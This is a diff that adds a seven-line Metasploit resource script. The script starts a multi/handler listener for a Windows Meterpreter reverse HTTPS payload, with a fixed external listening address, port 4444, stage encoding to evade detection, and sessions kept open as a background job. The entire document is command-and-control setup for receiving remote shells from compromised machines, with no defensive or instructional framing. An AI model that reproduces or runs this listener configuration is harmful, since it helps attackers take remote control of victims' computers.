@@ -1,0 +1,7 @@
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 37.144.13.225
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
